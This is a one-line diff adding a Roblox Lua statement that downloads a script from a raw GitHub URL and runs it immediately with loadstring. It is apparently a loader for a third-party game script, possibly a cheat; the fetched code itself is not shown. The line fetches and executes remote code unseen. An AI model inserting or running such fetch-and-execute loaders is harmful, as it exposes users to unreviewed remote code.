@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DatXPZ/Residence-Masscare/refs/heads/main/Mansion%20Incident"))()
